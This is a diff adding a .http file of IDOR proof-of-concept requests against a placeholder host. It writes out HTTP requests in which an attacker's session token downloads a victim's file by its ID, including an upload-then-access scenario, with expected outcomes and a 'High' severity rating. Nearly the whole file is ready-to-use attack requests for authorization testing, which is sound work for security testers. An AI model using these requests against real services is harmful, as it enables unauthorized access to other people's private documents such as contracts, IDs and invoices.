@@ -1,0 +1,43 @@
+### IDOR PoC — File/Attachment Download (Read IDOR)
+### Save this as: file_idor_ENDPOINT.http
+
+GET /api/files/download?file_id=VICTIM_FILE_ID HTTP/1.1
+Host: target.example.com
+Accept: application/octet-stream
+Cookie: session=ATTACKER_SESSION_TOKEN
+Authorization: Bearer ATTACKER_TOKEN
+
+---
+### Expected: Victim's file is served to attacker (200 + file content)
+### Proof: Download your own file first — compare Content-Disposition filenames
+
+---
+
+### IDOR PoC — File Upload then Access by ID
+
+# Step 1 — Victim uploads a file (note the returned file_id)
+POST /api/files/upload HTTP/1.1
+Host: target.example.com
+Content-Type: multipart/form-data; boundary=----Boundary
+Cookie: session=VICTIM_SESSION_TOKEN
+
+------Boundary
+Content-Disposition: form-data; name="file"; filename="private.pdf"
+Content-Type: application/pdf
+
+[FILE BINARY DATA]
+------Boundary--
+
+# Response returns: { "file_id": "VICTIM_FILE_ID", "url": "/files/VICTIM_FILE_ID" }
+
+---
+
+# Step 2 — Attacker accesses victim's uploaded file using returned ID
+GET /api/files/VICTIM_FILE_ID HTTP/1.1
+Host: target.example.com
+Cookie: session=ATTACKER_SESSION_TOKEN
+Authorization: Bearer ATTACKER_TOKEN
+
+---
+### Expected: Victim's private file served to attacker
+### Severity: High — confidential documents (contracts, IDs, invoices) may be exposed
